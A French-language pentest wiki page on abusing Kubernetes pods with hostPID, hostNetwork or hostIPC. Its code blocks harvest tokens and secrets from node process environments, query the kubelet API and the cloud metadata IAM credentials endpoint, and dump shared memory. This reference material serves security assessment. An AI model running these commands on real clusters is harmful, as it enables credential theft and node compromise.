---
order: 3
title: "Namespaces de l'hôte : portée sur le nœud via les pods hostPID, hostNetwork et hostIPC"
description: "Un pod avec hostPID, hostNetwork ou hostIPC rejoint le namespace correspondant du nœud. hostPID expose les processus du nœud et permet d'y injecter, hostNetwork atteint les services locaux du nœud comme le kubelet et les métadonnées cloud, et hostIPC expose la mémoire partagée du nœud, chacun étendant un pod vers la compromission du nœud et du cluster."
keywords:
  - hostpid
  - hostnetwork
  - hostipc
  - pod kubernetes
  - accès au nœud
---

# Namespaces de l'hôte

Définir `hostPID: true`, `hostNetwork: true` ou `hostIPC: true` sur un pod le rattache au namespace de processus, de réseau ou d'IPC du nœud. Aucun n'est en soi une évasion root directe, mais chacun restitue une part du nœud qui permet la compromission, et ils sont la forme Kubernetes des évasions par namespace partagé indépendantes du runtime.

Détectez lesquels sont définis :

```bash
ls /proc | grep -qE '^[0-9]+$' && readlink /proc/1/exe   # node init => hostPID
ip addr; ss -tlnp 2>/dev/null | head                      # node interfaces/ports => hostNetwork
ipcs                                                      # node IPC objects => hostIPC
```

## Voies

```bash
# hostPID: harvest secrets from node process environments; inject with CAP_SYS_PTRACE
for p in /proc/[0-9]*; do tr '\0' '\n' < $p/environ 2>/dev/null; done | \
  grep -iE 'token|secret|kube|aws' | sort -u
cat /proc/<kubelet_pid>/environ | tr '\0' '\n' | grep -i token

# hostNetwork: reach the kubelet API and cloud metadata on the node
curl -sk https://127.0.0.1:10250/pods | head
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/

# hostIPC: read node shared memory of other processes
ipcs -m; cat /dev/shm/* 2>/dev/null
```

La voie hostNetwork est la plus directement rentable : l'API kubelet en lecture-écriture sur le nœud et l'endpoint de métadonnées cloud sont tous deux des services locaux du nœud qu'un pod hostNetwork peut atteindre, et chacun mène plus loin.

## Notes d'exploitation

- hostPID plus `CAP_SYS_PTRACE` permet d'injecter dans un processus root du nœud ; sans ptrace, il fuite tout de même les environnements des processus du nœud et le token du kubelet lui-même.
- hostNetwork expose l'API kubelet ([API Kubelet](../exposed-components/kubelet-api.md)) et les métadonnées cloud ([Métadonnées cloud depuis un pod](../cluster-enumeration/cloud-metadata-from-pod.md)) ; ce sont deux cibles locales du nœud à forte valeur.
- Les mécanismes sous-jacents sont les [Namespaces d'hôte partagés](../../../container-escape/shared-host-namespaces/index.md) indépendants du runtime.

## Références

- [Kubernetes: pod security standards (host namespaces)](https://kubernetes.io/docs/concepts/security/pod-security-standards/)
- [BishopFox: bad pods (host namespaces)](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation)
